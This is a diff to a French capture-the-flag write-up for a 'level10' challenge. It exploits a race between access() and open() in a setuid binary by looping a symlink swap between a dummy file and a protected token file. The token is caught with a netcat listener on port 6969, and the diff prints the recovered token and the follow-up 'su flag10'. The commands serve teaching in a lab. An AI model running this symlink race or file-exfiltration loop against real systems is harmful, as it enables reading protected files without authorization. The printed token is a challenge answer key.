@@ -4,20 +4,20 @@ On exécute le script level10:
 -- sends file to host if you have access to it
 
 On en déduit que le script envoie un fichier à un host.
-On va donc aller envoyer les données sur un IP qui sur laquelle on peut envoyer des données... Notre machine lançant la VM !
-sur cette machine, on va écouter le port en censé recevoir les informations
-On peut trouvé le port en question en faisant un simple cat sur le script, level10.
-On comprend vite donc que c'est le port 6969via la ligne: Connecting to %s:6969 .. Unable to connect to host %s
-On retourne donc sur notre machine en lançant la commande nc -lk 6969, permettant ainsi d'écouter tout ce qui est envoyé sur le port 6969
-(garder deux terminal différent, un ayant nc -lk 6969 de lancer, et l'autre pour utiliser la VM en ssh)
+On va donc aller envoyer les données sur un IP qui sur laquelle on peut envoyer des données... l'ip de la VM !
+sur notre vm, on va écouter le port en censé recevoir les informations
+On peut trouvé le port en question en faisant un simple strings sur le script, level10.
+On comprend vite donc que c'est le port 6969 via la ligne: Connecting to %s:6969 .. Unable to connect to host %s
+On va donc ouvrir deux terminal (en ssh, pour nous faciliter la vie), un pour écouter le port 6969 avec la commande:
+nc -lk 6969
 
 On va donc tester tout cela.
-On crée un fichier: echo "test" > test
-On utilise lance le script level10: ./level10 test IP_DE_LA_MACHINE
+On crée un fichier: echo "test" > /tmp/test
+On utilise lance le script level10: ./level10 /tmp/test 127.0.0.1
 
-On remarque qu'on reçoit bien le contenu de notre fichier test.
+On remarque qu'on reçoit bien le contenu de notre fichier test sur notre second terminal.
 
-Ainsi on se dit qu'on va devoir envoyer le fichier token, pour qu'il soit lu, on peut ainsi essayer la commande: ./level10 token IP_DE_LA_MACHINE
+Ainsi on se dit qu'on va devoir envoyer le fichier token, pour qu'il soit lu, on peut ainsi essayer la commande: ./level10 token 127.0.0.1
 Mais cela ne fonctionne pas. "You don't have access to token".
 
 Il y a donc une sécurité, pour voir les appels systèmes utilisés par level10, on va lancer sur level10 un nm -u: nm -u level10
@@ -46,12 +46,20 @@ On voit que la vérification se fait au niveau du access, et qu'une fois que la 
 On sait qu'il y a une "race condition" entre access et open, c'est à dire qu'il y a un laps de temps d'environ 10ms entre les deux appels.
 
 On peut donc facilement prendre un fichier, et le faire swap de lien symbolique à l'infini entre, un fichier dont l'on possède l'accès, et notre fichier token.
-ceci nous permettra donc de valider l'accès du fichier, tout en envoyer un autre fichier(token)
+ceci nous permettra donc de valider l'accès du fichier, tout en envoyer un autre fichier (token)
 
-Pour cela on utilise la commande: while true ; do ln -sf our_file link ; ln -sf token link ; done &
+D'abord on se donne les droits sur notre home:
+chmod 777 .
 
-On lance en même temps notre commande pour envoyer le fichier sur notre machine mais pareil, avec un while
-while true; do ./level10 link IP_DE_LA_MACHINE ; done &
+On crée un fichier exploit qui va nous servir pour le swap de lien symbolique:
+touch exploit
+
+Ensuite on exécute la commande suivante, servant à swap likn entre token et exploit
+(while true; do ln -sf exploit link; ln -sf token link; done)&
+
+On lance en même temps notre commande pour envoyer le fichier sur notre port 6969 mais pareil, avec un while:
+while true; do ./level10 link 127.0.0.1; done
+
 
 On reçoit bien notre token sur la machine: woupa2yuojeeaaed06riuj63c
 On l'utilise pour se connecter à flag10: su flag10
